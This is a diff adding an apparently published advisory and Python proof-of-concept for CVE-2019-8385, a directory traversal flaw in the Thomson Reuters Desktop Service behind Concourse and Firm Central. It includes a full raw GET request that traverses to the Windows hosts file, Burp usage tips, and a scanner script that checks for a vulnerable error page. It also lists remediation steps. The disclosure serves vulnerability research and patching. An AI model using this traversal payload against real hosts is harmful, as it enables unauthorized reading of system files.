@@ -1,0 +1,118 @@
+'''
+# Exploit Title: Thomson Reuters Concourse & Firm Central < 2.13.0097 - Directory Traversal & Local File Inclusion
+# Date: 02/13/2019 
+# Exploit Author: 0v3rride
+# Vendor Homepage: https://www.thomsonreuters.com/en.html
+# Software Link: Firm Central (http://info.legalsolutions.thomsonreuters.com/software/firm-central/default.aspx) & Concourse (http://info.legalsolutions.thomsonreuters.com/software/concourse-matter-room/) 
+# Version: (< 2.13.0097 - Thomson Reuters Concourse & Firm Central) (ThomsonReuters.Desktop.Service.exe v1.9.0.358)
+# Affected Component: ThomsonReuters.Desktop.Service.exe and/or ThomsonReuters.Desktop.exe v1.9.0.358
+# Tested on: Windows
+# CVE: 2019-8385
+
+Summary:
+The ThomsonReuters.Desktop.Service.exe or ThomsonReuters.Desktop.exe does not properly handle a modified get request. All version prior to 2.13.0097 of Thomson Reuters Concourse and Firm Central utilize this component, thus they are affected after working with and speaking with the information security team at Thomson Reuters. By default the service listens on 6677, but is sometimes may be listening on ports 7000, 7001 or 7002.
+
+Exploitation:
+Currently, this vulnerability is only exploitable by modifying the
+request in the repeater module of Port Swigger's Burp suite tool. The
+affected component usually on port 6677 by default.
+
+E.g. GET request in burp suite
+
+GET \..\..\..\..\..\..\..\..\..\..\Windows\System32\drivers\etc\hosts HTTP/1.1
+Host: host.domain.tld:6677
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Cookie: _ga=GA1.2.1239644041.1549987630; _gid=GA1.2.1694605918.1549987630
+Upgrade-Insecure-Requests: 1
+
+Additionally, the file path cannot end with
+a backslash (\). You will be presented with following error if so -
+<h1>Page Not Found</h1>Sorry, we couldn't find what you were looking
+for . A sequence of at least five slash-dot-dots (\..) are needed. Furthermore, if you use the intruder module in Burp to automate the process, make sure that the payloads are not being encoded into any format (url encode, b64 encode, etc.) as this will mangle the request and you won't get a response.
+
+The python script checks for the error message by sending a request and looking for the error specified in the response. You can easily do this yourself by simply navigating to the FQDN or IP of the host on port 6677 or other port to see if you get the error in your web browser.
+
+Solution:
+
+    Download the latest version
+    Stop the Thomson Reuters Desktop Extensions service and set the startup type value to disabled using powershell, services.msc, etc.
+'''
+
+#!/usr/bin/env python
+
+#######################
+#   PoC by: 0v3rride  #
+#   DoC: March 2019   #
+#######################
+
+from argparse import *;
+from requests import *;
+
+def parseArgs():
+    parser = ArgumentParser();
+    parser.add_argument("-host", required=True, type=str, help="IP address or FQDN of the host to check");
+    parser.add_argument("-verbose", required=False, action="store_true", default=False, help="Returns a detailed response from the get request");
+    parser.add_argument("-tls", required=False, action="store_true", default=False, help="Use this flag is the target host is using https");
+    parser.add_argument("-port", required=False, type=int, default=6677, help="By default the Thomson Reuters Desktop Service listens on port 6677, but I've also seen it listen on ports 7000-7002");
+
+    return parser.parse_args();
+
+def check(cargs):
+    args = cargs
+    greq = None;
+
+    try:
+        if args.tls:
+            greq = get("{}{}:{}".format("https://", args.host, args.port));
+        elif not args.tls:
+            greq = get("{}{}:{}".format("http://", args.host, args.port));
+        else:
+            greq = get("{}{}:{}".format("http://", args.host, args.port));
+
+        if args.verbose:
+            print("{}:{}".format("Detailed Response", "-"*58));
+            for hdr in greq.headers.keys():
+                print("{}: {}".format(hdr, greq.headers[hdr]));
+
+        print("\n{}:{}".format("Vulnerability Information", "-"*50));
+
+        if greq.text.find("<h1>Page Not Found</h1>Sorry, we couldn't find what you were looking for ") > -1:
+            print("[!!!]: The target appears to be VULNERABLE to directory traversal!\n");
+            print("[i]: Use the following GET request value with the repeater tool in Burp Suite to confirm: \\..\\..\\..\\..\\..\\..\\..\\Windows\\System32\\Drivers\\etc\\hosts\n");
+            print("[i]: Make sure the paths you are traversing to don't end with a backslash '\\', otherwise it will not work. You'll know when this happens via an error message in the response.\n");
+            print("[i]: If you decide to run the request with the intruder tool in Brup Suite, then make sure Brup doesn't encode the payloads as this will not make it work either.\n");
+        else:
+            print("[i]: The target DOES NOT appear to be vulnerable to directory traversal. However, there is a chance that the error message was disabled, etc.\n")
+            print("[i]: You may to try the following GET request value with the repeater tool in Burp Suite to confirm: \\..\\..\\..\\..\\..\\..\\..\\Windows\\System32\\Drivers\\etc\\hosts\n");
+            print("[i]: Make sure the paths you are traversing to don't end with a backslash '\\'.\n");
+            print("[i]: If you decide to run the request with the intruder tool in Brup Suite, then make sure Brup doesn't encode the payloads as this will not make it work either.\n");
+    except:
+        print("[i]: A connection to the target could not be made!\n");
+        print("[i]: The target may not be vulnerable to directory traversal. Check your information regarding the target and arguments then try again.\n");
+
+
+def main():
+    print(r"""
+   ______     _______     ____   ___  _  ___         ___ _____  ___ ____
+  / ___\ \   / / ____|   |___ \ / _ \/ |/ _ \       ( _ )___ / ( _ ) ___|
+ | |    \ \ / /|  _| _____ __) | | | | | (_) |_____ / _ \ |_ \ / _ \___ \
+ | |___  \   / | |__|_____/ __/| |_| | |\__, |_____| (_) |__) | (_) |__) |
+  \____|  \_/  |_____|   |_____|\___/|_|  /_/       \___/____/ \___/____/
+                        [*] https://github.com/0v3rride
+                        [*] Script has started...
+                        [*] Use CTRL+C to cancel the script at anytime.
+                        
+    [!]: This script checks to see if the target appears vulnerable, but does not guarantee it! It does not exploit the vulnerability either!
+    [!]: You might need to use the dos2unix tool for conversion and functionality purposes on a Linux box!
+    """);
+
+    check(parseArgs());
+    #print(get("http://10.12.8.2:6677").text);
+    print("[!]: Done!");
+
+#Begin
+main();
